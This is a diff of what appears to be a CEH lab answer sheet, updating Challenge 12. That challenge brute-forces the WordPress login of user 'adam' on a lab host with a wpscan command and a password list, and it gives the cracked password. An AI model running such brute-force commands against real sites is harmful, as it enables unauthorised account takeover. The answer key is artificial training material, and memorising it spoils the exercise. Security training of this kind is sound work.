@@ -102,7 +102,7 @@ Answer: 36
 
 **Challenge** 12:
 Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
-- wpscan --url http://www.cehorg.com/wp-login.php -U adam -P password.txt
+- wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U adam -P password.txt
 - use password list in desktop
 
 Answer: orange1234
